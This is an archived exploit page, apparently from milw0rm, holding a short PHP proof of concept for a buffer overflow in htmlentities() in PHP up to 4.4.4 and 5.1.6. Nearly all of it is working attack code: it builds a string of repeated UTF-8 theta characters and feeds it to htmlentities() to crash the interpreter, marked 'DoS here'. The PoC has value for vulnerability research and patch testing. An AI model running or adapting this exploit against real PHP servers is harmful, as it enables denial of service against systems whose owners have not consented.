<html><head><title>PHP <= 4.4.4/5.1.6 htmlentities() Local Buffer Overflow PoC</title></head><pre>&lt;?php
	/*	    Nick Kezhaya	*/
	/*    www.whitepaperclip.com 	*/
	
	//instantiate a string
	$str1 = &quot;&quot;;
	
	for($i=0; $i &lt; 64; $i++) {
		$str1 .= toUTF(977); //MUST start with 977 before bit-shifting
	}
	
	htmlentities($str1, ENT_NOQUOTES, &quot;UTF-8&quot;); //DoS here
	/*
		htmlentities() method automatically assumes
		it is a max of 8 chars.  uses greek theta
		character bug from UTF-8
	*/
	
?&gt;

&lt;?php
	function toUTF($x) {
		return chr(($x &gt;&gt; 6) + 192) . chr(($x &amp; 63) + 128);
	}
?&gt;

# milw0rm.com [2006-11-27]</pre></html>